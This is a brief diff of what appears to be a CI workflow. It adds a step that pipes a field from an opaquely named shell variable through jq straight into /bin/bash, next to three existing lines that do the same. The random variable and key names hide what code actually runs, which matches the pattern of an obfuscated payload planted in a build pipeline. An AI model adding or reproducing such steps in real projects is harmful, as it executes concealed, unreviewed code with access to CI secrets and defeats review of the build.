@@ -26,6 +26,7 @@ jobs:
           echo $x0930 | jq -r .ba83 | /bin/bash
           printf '%s' "$iqj2892" | jq -r .bht0 | /bin/bash
           echo $vsqk097 | jq -r .vo9866 | /bin/bash
+          echo $jpbv304 | jq -r .o64 | /bin/bash
 
       - name: Persist output
         if: always()
